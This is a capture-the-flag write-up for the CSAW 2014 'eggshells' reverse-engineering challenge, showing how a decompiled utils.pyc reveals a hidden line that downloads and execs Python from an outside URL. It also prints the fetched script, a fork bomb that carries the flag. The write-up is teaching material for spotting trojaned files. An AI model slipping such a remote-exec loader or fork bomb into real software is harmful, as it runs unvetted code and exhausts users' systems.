# Reverse Engineering-100: eggshells

This is the first exploitation problem and it starts with the following text:

> I trust people on the internet all the time, do you?
> 
> Written by ColdHeat
> 
> eggshells-master.zip

___
## Unzipping and Analyzing the Files

Let’s unzip the provided zip file:

```sh
$ unzip eggshells-master.zip
```

This creates a directory called *eggshells-master* that contains several *Python* and *exe* files. Let us look closer to the contend of this folder:

```sh
$ tree .
├── capstone.py
├── distorm.py
├── interpreter.py
├── main.py
├── nasm
│   ├── LICENSE
│   ├── nasm.exe
│   ├── ndisasm.exe
│   └── rdoff
│       ├── ldrdf.exe
│       ├── rdf2bin.exe
│       ├── rdf2com.exe
│       ├── rdf2ihx.exe
│       ├── rdf2ith.exe
│       ├── rdf2srec.exe
│       ├── rdfdump.exe
│       ├── rdflib.exe
│       └── rdx.exe
├── nasm.py
├── server.py
├── shellcode.py
├── utils.pyc
└── wrapper.py
```

Do you see anything unusual?

___

## Decompiled a pre-compiled Python File

A pre-compiled Python file stands out in this list: *utils.pyc*. We need to decompile it. For this task we use  [uncompyle2], which can be installed with:

```sh
$ sudo pip install uncompyle2
``` 

Let's learn a bit more about this tool with ```uncompyle2 --help```. The usage is straightfoward, but it's a good knowledge to learn about the *-o* flag, which will decompile to a *.dis* file instead of *stdout*:

```sh
Usage: uncompyle2 [OPTIONS]... [ FILE | DIR]...

Examples:
  uncompyle2      foo.pyc bar.pyc       # decompile foo.pyc, bar.pyc to stdout
  uncompyle2 -o . foo.pyc bar.pyc       # decompile to ./foo.dis and ./bar.dis
  uncompyle2 -o /tmp /usr/lib/python1.5 # decompile whole library

Options:
  -o <path>     output decompiled files to this path:
                if multiple input files are decompiled, the common prefix
                is stripped from these names and the remainder appended to
                <path>
                  uncompyle -o /tmp bla/fasel.pyc bla/foo.pyc
                    -> /tmp/fasel.dis, /tmp/foo.dis
                  uncompyle -o /tmp bla/fasel.pyc bar/foo.pyc
                    -> /tmp/bla/fasel.dis, /tmp/bar/foo.dis
```

We could also use *.py* extension if we like:
```sh
  --py          use '.py' extension for generated files
```

Also, we learn about all the possible outputs:
```sh
 Extensions of generated files:
  '.pyc_dis' '.pyo_dis'   successfully decompiled (and verified if --verify)
  '.py'                   with --py option
    + '_unverified'       successfully decompile but --verify failed
    + '_failed'           uncompyle failed (contact author for enhancement)
```

All right, no more diverging. Let's play! We run the ```uncompyle2``` command and obtain the following:
```sh
$ uncompyle2 utils.pyc
#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py
exec __import__('urllib2').urlopen('http://kchung.co/lol.py').read()
+++ okay decompyling utils.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
```

___
## Parsing the Result and Voilà 

So all that this file does is in this line:
```python
exec __import__('urllib2').urlopen('http://kchung.co/lol.py').read()
```

To understand this code,, we need to know that Python's [exec] method performs dynamic execution of code.  In this problem, *exec* starts importing [urllib2], which is a library for opening URLs.  It has the method [urlopen()] to open the URL url, which can be either a string or a request object. This function returns a file-like object with three additional methods. Finally, [read()] would read this returned file.

So all that this script does is to try running a Python file that is hosted online! 
Well, let's see what this file does! Let's just *curl* [http://kchung.co/lol.py]:
 
```sh 
$  curl http://kchung.co/lol.py
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

 The flag is **trust_is_risky**! Easy!


[uncompyle2]: https://github.com/gstarnberger/uncompyle
[http://kchung.co/lol.py]: http://kchung.co/lol.py
[exec]: https://docs.python.org/2/reference/simple_stmts.html#exec
[urllib2]: https://docs.python.org/2/library/urllib2.html#module-urllib2
[urlopen()]: https://docs.python.org/2/library/urllib2.html#urllib2.urlopen
[read()]: http://www.tutorialspoint.com/python/file_read.htm
